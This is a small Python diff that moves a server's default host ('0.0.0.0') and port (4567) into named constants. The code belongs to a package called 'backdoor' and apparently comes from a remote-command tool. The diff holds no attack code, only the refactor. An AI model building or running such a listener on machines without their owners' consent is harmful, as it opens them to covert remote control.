@@ -15,6 +15,10 @@ from backdoor.serialization.jsonserializer import JsonSerializer
 from backdoor.utils.errors import print_error
 
 
+DEFAULT_HOST = "0.0.0.0"
+DEFAULT_PORT = 4567
+
+
 class Server:
 
     def __init__(
@@ -23,8 +27,8 @@ class Server:
         exchanger: ServerExchangeMapper,
         converter: InputToCommandConverter,
         processor: CommandProcessor,
-        host: str = "0.0.0.0",
-        port: int = 4567,
+        host: str = DEFAULT_HOST,
+        port: int = DEFAULT_PORT,
     ) -> None:
         self.host = host
         self.port = port
@@ -75,8 +79,8 @@ class Server:
 
 def parse_args() -> Namespace:
     parser = ArgumentParser()
-    parser.add_argument("-a", "--host", required=False, default="0.0.0.0")
-    parser.add_argument("-p", "--port", required=False, default=4567, type=int)
+    parser.add_argument("-a", "--host", required=False, default=DEFAULT_HOST)
+    parser.add_argument("-p", "--port", required=False, default=DEFAULT_PORT, type=int)
     return parser.parse_args()
 
 
